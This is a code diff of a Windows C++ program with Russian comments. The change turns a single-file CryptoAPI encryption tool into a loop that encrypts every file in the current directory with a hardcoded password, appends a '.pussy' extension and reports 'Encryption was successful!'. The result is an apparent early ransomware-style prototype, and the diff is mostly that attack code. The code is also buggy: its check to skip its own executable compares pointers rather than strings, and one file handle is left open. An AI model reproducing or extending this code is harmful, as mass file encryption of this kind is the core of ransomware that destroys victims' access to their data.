@@ -9,49 +9,66 @@
 #include <wincrypt.h>
 #include <stdio.h>
 #include <tchar.h>
+#include <cstdlib>
+
+void EncryptMyFile(WCHAR *nameFile, char* password);
 
 int main(int argv, char *argc[])
 {
+    char *pass = "password";
+
     //Поиск файла по маске
- /*   WIN32_FIND_DATA FindFileData;
+    WIN32_FIND_DATA FindFileData;
     LARGE_INTEGER filesize;
     HANDLE hFind;
 
-    LPCTSTR lpzMaskFile = L"*.o";
+    LPCTSTR lpzMaskFile = L"*";
 
     hFind = FindFirstFile(lpzMaskFile, &FindFileData);
     if (hFind == INVALID_HANDLE_VALUE)
     {
         printf("FindFirstFile failed %d\n", GetLastError());
+        return 0;
     }
     else
     {
-        _tprintf(TEXT("The first file found is %s\n"),FindFileData.cFileName);
+        //_tprintf(TEXT("The first file found is %s\n"),FindFileData.cFileName);
     }
+
+    printf("Files for encryption:\n\n");
 
     do
     {
        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
-          _tprintf(TEXT("%s   <DIR>\n"), FindFileData.cFileName);
+          //_tprintf(TEXT("<DIR> %s\n"), FindFileData.cFileName);
+           continue;
        }
        else
        {
-          filesize.LowPart = FindFileData.nFileSizeLow;
-          filesize.HighPart = FindFileData.nFileSizeHigh;
-          _tprintf(TEXT("%s   %ld bytes\n"), FindFileData.cFileName, filesize.QuadPart);
+          //filesize.LowPart = FindFileData.nFileSizeLow;
+          //filesize.HighPart = FindFileData.nFileSizeHigh;
+          _tprintf(TEXT("%s\n"), FindFileData.cFileName/*, filesize.QuadPart*/);
+
+          //Ширование найденого файла
+          EncryptMyFile(FindFileData.cFileName, pass);
        }
     }
     while (FindNextFile(hFind, &FindFileData) != 0);
 
-    FindClose(hFind);
-*/
-    //---------------------------------------------------------
+    printf("\nEncryption was successful!");
 
+    FindClose(hFind);
+
+    return 0;
+}
+
+void EncryptMyFile(WCHAR *nameFile, char* password)
+{
     //char* to wchar_t*
-    const size_t size = strlen(argc[2]) + 1;
+    const size_t size = strlen(password) + 1;
     wchar_t* wPass = new wchar_t[size];
-    mbstowcs(wPass, argc[2], size);
+    mbstowcs(wPass, password, size);
 
     HCRYPTPROV hProv = 0; //Дескриптор крипртопровайдера
     HCRYPTKEY hKey = 0;   //Дескриптор ключа
@@ -67,23 +84,45 @@ int main(int argv, char *argc[])
     bool work = true;   //Условие совершения итераций while
     size_t sh = 0;      //Сколько символов считано из файла
 
-    //Формируем имена файлов
-    char cryptname[128] = "";
-    char decryptname[128] = "decrypt.";
+    //----------------------Формируем имена файлов-----------------------------
 
-    strcat(cryptname, argc[1]);
-    strcat(cryptname, ".pussy");
-    strcat(decryptname, argc[1]);
+    WCHAR *wszNameFile = nameFile;
+    WCHAR wszNameFileEncrypt[128];
+    WCHAR wszNameFileDecrypt[128];
+    WCHAR *wszExpansion = L".pussy";
+    WCHAR *wszExpansionDecrypt = L".dec";
+
+    wcsncpy(wszNameFileEncrypt, wszNameFile, 128);
+    wcscat(wszNameFileEncrypt, wszExpansion);
+
+    wcsncpy(wszNameFileDecrypt, wszNameFile, 128);
+    wcscat(wszNameFileDecrypt, wszExpansionDecrypt);
+
+    char* filename = (char*)malloc(100);
+    wcstombs(filename, wszNameFile, 100);
+
+    char* cryptname = (char*)malloc(100);
+    wcstombs(cryptname, wszNameFileEncrypt, 100);
+
+    char* decryptname = (char*)malloc(100);
+    wcstombs(decryptname, wszNameFileDecrypt, 100);
+
+    if(filename == "AES_W.exe")
+    {
+        return;
+    }
+
+    //-----------------------------------------------------------------------
 
     //Открытие файлов
-    FILE *f = fopen(argc[1], "ab+" );          //исходный
+    FILE *f = fopen(filename, "ab+" );          //исходный
     FILE *sf = fopen(cryptname, "ab+" );       //зашифрованный
     FILE *svf = fopen(decryptname, "ab+" );    //расшифрованный
 
     if((f == 0) || (sf == 0) || (svf == 0))
     {
         printf("Ошибка открытия файла!");
-        return 0;
+        return;
     }
 
     //Получаем контекст криптопровайдера
@@ -194,7 +233,7 @@ int main(int argv, char *argc[])
 */
         //-----Пишем в файл------------
         fwrite(&dwData, sizeof(BYTE), sh, svf);
-        if(ferror(sf))
+        if(ferror(svf))
             printf("Ошибка потока ввода/вывода!\n");
         //-----------------------------
     }
@@ -215,8 +254,6 @@ Cleanup:
 
     fclose(f);
     fclose(sf);
-    fclose(svf);
+    //fclose(svf);
     delete[] wPass;
-
-    return 0;
 }
